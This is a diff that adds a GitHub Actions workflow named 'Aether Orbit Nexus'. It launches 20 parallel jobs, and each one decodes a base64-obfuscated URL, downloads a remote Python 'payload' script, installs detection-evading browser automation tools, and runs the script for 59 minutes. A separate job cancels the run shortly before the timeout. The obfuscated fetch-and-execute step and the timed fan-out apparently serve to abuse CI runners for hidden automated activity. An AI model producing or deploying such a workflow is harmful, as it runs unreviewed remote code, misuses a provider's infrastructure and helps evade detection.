@@ -1,0 +1,103 @@
+name: Aether Orbit Nexus
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: orbit-net-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Core Overseer: monitors elapsed time and signals job termination
+  # =================================================================
+  core-overseer:
+    name: "Overseer Monitor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_DURATION: 3540
+    steps:
+      - name: Initialize Overseer
+        run: |
+          echo "[OVERSEER] System monitor activated for execution ID: ${{ github.run_id }}"
+          echo "[OVERSEER] Holding timer for ${WATCH_DURATION} seconds."
+
+          sleep "${WATCH_DURATION}"
+
+          echo "[OVERSEER] Target duration elapsed — issuing abort request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[OVERSEER] Abort request transmitted successfully."
+
+  # =================================================================
+  # Cluster Nodes: parallel execution across designated matrix units
+  # =================================================================
+  cluster-nodes:
+    name: "Node-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [A101, B102, C103, D104, E105, F106, G107, H108, I109, J110, K111, L112, M113, N114, O115, P116, Q117, R118, S119, T120]
+
+    steps:
+      # #################################################################
+      # Phase 1: Environment setup
+      # #################################################################
+      - name: Setup Environment
+        run: |
+          echo "[SETUP] Preparing Node-${{ matrix.node_code }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Phase 2: Retrieve core payload script
+      # #################################################################
+      - name: Fetch Payload Script
+        run: |
+          echo "[FETCH] Fetching core script from external mirror..."
+          REMOTE_PAYLOAD=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_PAYLOAD" -o app_runner.py
+          echo "[FETCH] Core script successfully saved."
+
+      # #################################################################
+      # Phase 3: Prepare runtime dependencies
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPENDENCIES] Installing required Python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Phase 4: Execute payload background process
+      # #################################################################
+      - name: Execute Main Process
+        run: |
+          echo ">> Starting Node-${{ matrix.node_code }} process..."
+
+          python3 app_runner.py &
+          APP_PID=$!
+
+          echo ">> Process started. Operational window: 59 minutes (3540 seconds)."
+
+          sleep 3540
+
+          if kill -0 "$APP_PID" 2>/dev/null; then
+            echo ">> Operational window reached — stopping process."
+            kill -9 "$APP_PID"
+            echo ">> Process stopped by time controller."
+          else
+            echo ">> Process exited prior to limit."
+          fi
